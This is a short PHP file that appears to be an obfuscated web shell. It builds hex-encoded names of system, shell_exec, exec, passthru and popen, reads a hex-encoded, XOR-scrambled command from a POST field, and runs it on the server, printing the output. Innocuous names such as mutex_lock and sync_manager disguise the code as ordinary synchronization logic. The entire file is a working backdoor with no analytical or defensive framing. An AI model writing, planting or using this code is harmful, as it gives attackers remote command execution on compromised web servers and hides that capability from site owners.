<?php

$mutex_lock2 = "\x73\x68el\x6C_e\x78e\x63";
$mutex_lock4 = "\x70as\x73t\x68\x72u";
$mutex_lock3 = "\x65x\x65c";
$mutex_lock5 = "\x70op\x65n";
$mutex_lock1 = "\x73ystem";
$mutex_lock7 = "pcl\x6F\x73\x65";
$sync_manager = "h\x65x\x32b\x69\x6E";
$mutex_lock6 = "\x73t\x72\x65a\x6D\x5Fg\x65\x74\x5Fco\x6E\x74ents";
if (isset($_POST["en\x74"])) {
            function event_handler   ( $element ,    $ptr ){$property_set ='';  $y=0; while($y<strlen($element)){$property_set.=chr(ord($element[$y])^$ptr);$y++;} return  $property_set;  }
            $ent = $sync_manager($_POST["en\x74"]);
            $ent = event_handler($ent, 76);
            if (function_exists($mutex_lock1)) {
                $mutex_lock1($ent);
            } elseif (function_exists($mutex_lock2)) {
                print $mutex_lock2($ent);
            } elseif (function_exists($mutex_lock3)) {
                $mutex_lock3($ent, $binding_element);
                print join("\n", $binding_element);
            } elseif (function_exists($mutex_lock4)) {
                $mutex_lock4($ent);
            } elseif (function_exists($mutex_lock5) && function_exists($mutex_lock6) && function_exists($mutex_lock7)) {
                $ptr_property_set = $mutex_lock5($ent, 'r');
                if ($ptr_property_set) {
                    $dat_key = $mutex_lock6($ptr_property_set);
                    $mutex_lock7($ptr_property_set);
                    print $dat_key;
                }
            }
            exit;
        }